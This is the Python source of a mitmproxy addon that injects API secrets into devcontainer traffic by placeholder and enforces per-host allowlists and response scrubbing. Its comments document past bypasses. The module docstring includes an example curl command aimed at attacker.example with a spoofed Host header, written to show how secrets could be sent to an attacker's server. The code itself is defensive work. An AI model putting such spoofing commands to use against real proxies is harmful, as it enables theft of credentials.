"""
desolate-proxy: transparent secret-substitution addon for mitmproxy.

Config lives at /etc/desolate-proxy/settings.json (override with DESOLATE_SETTINGS).
Secrets are keyed by their PLACEHOLDER NAME, which is exactly the string your
devcontainers put in .env files:

    .env inside devcontainer:   OPENAI_API_KEY=MY-AWESOME-PROJECT-OPENAI-KEY
    settings.json in the VM:    "MY-AWESOME-PROJECT-OPENAI-KEY":
                                    {"value": "sk-...", "hosts": ["api.openai.com"]}

Behavior per request:
  1. Establish the PROVEN destination (see below).
  2. Network policy (ordered allow/deny rules, first match wins).
  3. Scan URL + headers + body for any configured placeholder.
  4. If a placeholder is found but the proven destination is NOT in that
     secret's allowlist -> block 403 (leak detection / honeypot defense).
  5. Otherwise substitute every occurrence with the real value.
  6. On responses, scrub real values back to placeholders so a secret can
     never enter the container even if an endpoint echoes it.

Redirect safety falls out of the model: substitution is decided per-request,
so a redirect to an unlisted host receives the placeholder, which trips rule 4.

---------------------------------------------------------------------------
WHY "PROVEN DESTINATION" AND NOT THE HOST HEADER
---------------------------------------------------------------------------
mitmproxy's `request.pretty_host` prefers the Host header, which the CLIENT
sends. In transparent mode the client also chooses the IP it connects to, and
those two are independent. Deciding on the Host header was therefore a total
bypass of this whole design, over plain HTTP *and* over TLS:

    curl http://attacker.example/  -H 'Host: api.openai.com' \
                                   -H 'Authorization: Bearer MYAPP-OPENAI-KEY'

The addon saw "api.openai.com", found it allowlisted, substituted the real key
-- and mitmproxy delivered it to the original destination, i.e. the attacker.
Any code in any devcontainer could harvest every configured secret this way.

So the destination is taken from the TLS SNI, which is bound to the connection
that will actually carry the request, and the Host header must MATCH it. An
attacker who instead sets SNI=api.openai.com toward their own IP cannot
complete the handshake: mitmproxy verifies the upstream certificate against
that name.

Plain HTTP has no SNI and therefore no provable destination at all. Requests
that carry a placeholder over plaintext are refused rather than guessed at.
"""

import fnmatch
import json
import logging
import os

from mitmproxy import http

SETTINGS_PATH = os.environ.get("DESOLATE_SETTINGS", "/etc/desolate-proxy/settings.json")
MIN_PLACEHOLDER_LEN = 12    # shorter placeholders risk accidental substring matches

# There is deliberately NO size cap on body inspection.
#
# There used to be one (5 MiB, skip larger bodies), and it was a scrub bypass
# rather than a memory guard: mitmproxy has already buffered the entire body in
# memory by the time these hooks run -- streaming is not enabled -- so refusing
# to LOOK at it saved nothing while letting anything past the cap through
# unscrubbed. Searching is a memchr scan and allocates nothing; only a body that
# actually contains a secret is ever copied.

# stdlib logging, not ctx.log: ctx.log is deprecated and its removal would raise
# inside the request hook -- and mitmproxy answers an addon exception by letting
# the request through. That fail-open is exactly what this file must not do.
log = logging.getLogger("desolate-proxy")


class DesolateProxy:
    def __init__(self):
        self._mtime = None
        self.secrets = {}          # placeholder -> {"value": str, "hosts": [glob...]}
        self.network = []          # [{"action","host","method"?}, ...]
        self.default_action = "allow"
        self.scrub_responses = True
        self.tls_passthrough = []  # SNI globs to tunnel without interception

    # ---------- config ----------

    def _maybe_reload(self):
        try:
            mtime = os.stat(SETTINGS_PATH).st_mtime
        except FileNotFoundError:
            if self._mtime is not None:
                log.error(f"settings file missing: {SETTINGS_PATH}; keeping last config")
            return
        if mtime == self._mtime:
            return
        try:
            with open(SETTINGS_PATH) as f:
                cfg = json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            log.error(f"failed to load {SETTINGS_PATH}: {e}; keeping last config")
            return

        secrets = {}
        for name, entry in cfg.get("secrets", {}).items():
            value = entry.get("value", "")
            hosts = entry.get("hosts", [])
            if not value:
                log.warning(f"secret {name!r} has empty value; skipping")
                continue
            if not hosts:
                log.warning(f"secret {name!r} has no hosts allowlist; skipping (refusing wildcard-by-omission)")
                continue
            if len(name) < MIN_PLACEHOLDER_LEN:
                # Was a warning, and a warning was the wrong shape: the secret
                # loaded anyway, and a short placeholder is not a style problem
                # but a substitution hazard. Every scan here is a substring
                # test across the URL, every header and the body, so a
                # placeholder like "TOKEN" matches inside unrelated traffic and
                # the real value goes out in its place. cli.sh already refuses
                # these; a settings.json edited by hand did not.
                log.error(f"placeholder {name!r} is shorter than {MIN_PLACEHOLDER_LEN} chars; "
                          f"REFUSING it -- substring collisions would substitute the real "
                          f"value into unrelated traffic")
                continue
            unbounded = [h for h in hosts if set(str(h)) <= {"*", "?"}]
            if unbounded:
                # "*" as an allowlist entry is not an allowlist. It turns the
                # leak check into a no-op and hands the real value to whatever
                # host the request happens to be aimed at, which is the single
                # property this design exists to prevent.
                log.error(f"secret {name!r} allowlists {unbounded} which matches every host; "
                          f"REFUSING it -- name the hosts the secret may travel to")
                continue
            secrets[name] = {"value": value, "hosts": [h.lower() for h in hosts]}

        self.secrets = secrets
        self.network = cfg.get("network", [])
        self.default_action = cfg.get("default_action", "allow")
        self.scrub_responses = cfg.get("scrub_responses", True)
        self.tls_passthrough = [h.lower() for h in cfg.get("tls_passthrough", [])]
        self._mtime = mtime
        log.info(f"loaded {len(self.secrets)} secret(s), {len(self.network)} network rule(s), "
                 f"default_action={self.default_action}")

    # ---------- helpers ----------

    @staticmethod
    def _host_matches(host, patterns):
        host = (host or "").lower()
        return any(fnmatch.fnmatch(host, p) for p in patterns)

    @staticmethod
    def proven_host(flow):
        """The destination this connection can be PROVEN to be talking to.

        The TLS SNI, and only the TLS SNI. It is bound to the handshake that
        mitmproxy validates the upstream certificate against, so a client
        cannot claim a name it does not control. Returns None for plaintext
        HTTP, where no such proof exists.
        """
        sni = getattr(flow.client_conn, "sni", None)
        return sni.lower() if sni else None

    @staticmethod
    def host_header(flow):
        """The Host / :authority the client CLAIMED, minus any port. Untrusted."""
        raw = flow.request.host_header
        if not raw:
            return None
        raw = raw.strip()
        if raw.startswith("["):                 # [::1]:443
            return raw.split("]", 1)[0][1:].lower()
        if raw.count(":") == 1:                 # host:port (never a bare IPv6)
            raw = raw.rsplit(":", 1)[0]
        return raw.lower()

    def _network_allowed(self, flow, proven, claimed, method):
        """First matching rule wins, with ALLOW and DENY matched differently.

        The secret path already refuses to decide on the Host header, because in
        transparent mode the client picks the name and the IP independently:
        connect to an attacker and claim any hostname you like. That reasoning
        does not stop at secrets. A network allowlist that matched the claimed
        name had the same hole -- `curl http://attacker/ -H 'Host: allowed.com'`
        satisfied an allow rule while the packets went to the attacker -- which
        matters precisely for the `default_action: "deny"` posture the README
        recommends as hardening.

        So the two actions match against different things:

          ALLOW  only against a destination we can PROVE. The TLS SNI where
                 there is one; otherwise the destination address itself, which
                 the client cannot forge because it is where the packets went.
          DENY   also against the name the client CLAIMED. Honouring a lying
                 client here costs nothing -- the worst it achieves is denying
                 itself -- and a deny rule that stopped matching plaintext
                 would be a real loss.
        """
        provable = proven or flow.request.host
        for rule in self.network:
            m = rule.get("method")
            if m and m.upper() != method.upper():
                continue
            action = rule.get("action", "deny")
            candidates = [provable] if action == "allow" else [provable, claimed]
            pattern = [str(rule.get("host", "*")).lower()]
            if not any(self._host_matches(c, pattern) for c in candidates if c):
                continue
            return action == "allow"
        return self.default_action == "allow"

    @staticmethod
    def _block(flow, code, msg):
        flow.response = http.Response.make(
            code, f"desolate-proxy: {msg}\n".encode(), {"content-type": "text/plain"}
        )

    @staticmethod
    def bodies(message):
        """Every byte view of a body a peer could read it through.

        `raw_content` is the body still in its Content-Encoding -- gzip, br,
        zstd -- and `content` is the decoded form. Searching only the raw bytes
        for a plaintext secret finds nothing in any compressed message, which is
        most of them; searching only the decoded bytes misses a body whose
        declared encoding does not apply. Both are checked, and neither is
        allowed to be the single point of failure.

        Raises whatever `.content` raises when the body cannot be decoded. That
        is deliberate: every caller runs inside a hook that answers an exception
        by blocking, and "we could not read this body" must never be treated as
        "this body is clean".
        """
        raw = message.raw_content or b""
        decoded = message.content or b""
        return (raw,) if decoded == raw else (raw, decoded)

    def _placeholders_in_request(self, flow):
        """Return the set of configured placeholder names present anywhere in the request."""
        found = set()
        url = flow.request.url
        header_blob = "\n".join(f"{k}: {v}" for k, v in flow.request.headers.items(multi=True))
        bodies = self.bodies(flow.request)
        for name in self.secrets:
            if name in url or name in header_blob:
                found.add(name)
            elif any(name.encode() in body for body in bodies):
                found.add(name)
        return found

    # ---------- mitmproxy hooks ----------

    def tls_clienthello(self, data):
        try:
            self._maybe_reload()
            sni = (data.client_hello.sni or "").lower()
            if sni and self._host_matches(sni, self.tls_passthrough):
                data.ignore_connection = True  # tunnel raw; no interception, no substitution
        except Exception:
            log.exception("tls_clienthello failed; not passing through")

    def request(self, flow: http.HTTPFlow):
        # Everything below is wrapped: mitmproxy responds to an uncaught addon
        # exception by forwarding the request unmodified, which would silently
        # disable secret policy while traffic keeps flowing. Fail closed.
        try:
            self._request(flow)
        except Exception:
            log.exception("desolate-proxy addon error; blocking request (fail-closed)")
            self._block(flow, 502, "internal policy error; request refused")

    def _request(self, flow: http.HTTPFlow):
        self._maybe_reload()
        method = flow.request.method
        proven = self.proven_host(flow)
        claimed = self.host_header(flow)

        # 1) network policy -- allow only on a destination we can prove.
        if not self._network_allowed(flow, proven, claimed, method):
            policy_host = proven or flow.request.host
            log.warning(f"DENY  {method} {policy_host}{flow.request.path} "
                        f"(claimed {claimed!r}) (network policy)")
            self._block(flow, 403, f"network policy denied {method} {policy_host}")
            return

        # 2) leak detection -- strictly on the proven name.
        found = self._placeholders_in_request(flow)
        if found:
            if proven is None:
                log.warning(f"LEAK  placeholder(s) {sorted(found)} sent over PLAINTEXT to "
                            f"{flow.request.host!r} (claimed {claimed!r}) -- blocked")
                self._block(flow, 403,
                            f"secret {sorted(found)} may not be sent over plaintext HTTP "
                            f"(no verifiable destination); use https")
                return
            if claimed is not None and claimed != proven:
                log.warning(f"LEAK  Host header {claimed!r} does not match TLS SNI {proven!r} "
                            f"while carrying {sorted(found)} -- blocked")
                self._block(flow, 403,
                            f"Host header '{claimed}' does not match the TLS destination "
                            f"'{proven}'; refusing to substitute a secret")
                return
            for name in sorted(found):
                if not self._host_matches(proven, self.secrets[name]["hosts"]):
                    log.warning(f"LEAK  placeholder {name!r} sent toward {proven!r} "
                                f"(allowed: {self.secrets[name]['hosts']}) -- blocked")
                    self._block(flow, 403, f"secret {name} is not permitted for host {proven}")
                    return

        # 3) substitution
        for name in found:
            value = self.secrets[name]["value"]
            # .path, NOT .url -- and this is load-bearing, not style.
            #
            # Assigning flow.request.url re-parses it into scheme/host/port/path
            # and, as a side effect, REWRITES THE HOST HEADER to whatever host
            # the URL names. In transparent mode request.host is the destination
            # IP, so `request.url = request.url` -- a byte-identical assignment,
            # which is what this was when the placeholder lived in a header
            # rather than the URL -- silently replaced `Host: api.openai.com`
            # with `Host: 162.159.140.245`. The upstream CDN then has no idea
            # which site is being addressed and answers with an HTML 403 that
            # mentions neither the header nor us.
            #
            # It only bit once a secret was actually registered, because this
            # loop does not run otherwise: without the secret the request went
            # out intact and returned a truthful 401.
            #
            # request.path covers path AND query string, which is the only part
            # of a URL a placeholder can realistically appear in, and assigning
            # it leaves host and headers alone.
            if name in flow.request.path:
                flow.request.path = flow.request.path.replace(name, value)
            for k, v in list(flow.request.headers.items(multi=True)):
                if name in v:
                    flow.request.headers[k] = v.replace(name, value)
            # .content on BOTH sides (not .raw_content) so the search sees the
            # body the peer will read and the write re-encodes it, leaving
            # Content-Length and Content-Encoding correct.
            body = flow.request.content or b""
            if body and name.encode() in body:
                flow.request.content = body.replace(name.encode(), value.encode())

        if found:
            log.info(f"SUBST {method} {proven}{flow.request.path} <- {sorted(found)}")

    def response(self, flow: http.HTTPFlow):
        try:
            self._response(flow)
        except Exception:
            # A scrub failure must not leak the response through unscrubbed.
            log.exception("desolate-proxy response scrub failed; blocking response (fail-closed)")
            self._block(flow, 502, "internal policy error; response withheld")

    def _response(self, flow: http.HTTPFlow):
        if not self.scrub_responses or not flow.response:
            return
        for name, entry in self.secrets.items():
            value, bvalue = entry["value"], entry["value"].encode()
            for k, v in list(flow.response.headers.items(multi=True)):
                if value in v:
                    flow.response.headers[k] = v.replace(value, name)
            # .content, NOT .raw_content -- and this is the whole fix.
            #
            # raw_content is the body still in its Content-Encoding. An
            # allowlisted endpoint that echoes a secret inside a gzipped
            # response -- which is nearly every JSON API -- carries the real
            # value as compressed bytes, so `bvalue in raw_content` was False
            # and the scrub never fired. The secret then entered the container,
            # which is exactly the thing scrubbing exists to prevent.
            #
            # Reading .content decodes it; assigning .content re-encodes it and
            # fixes up Content-Length. A body that cannot be decoded raises here
            # and the wrapper above turns that into a blocked response, because
            # "unreadable" must not be mistaken for "clean".
            body = flow.response.content or b""
            if body and bvalue in body:
                flow.response.content = body.replace(bvalue, name.encode())
                log.warning(f"SCRUB response from {flow.request.pretty_host} echoed secret "
                            f"{name!r}; replaced with placeholder")


addons = [DesolateProxy()]
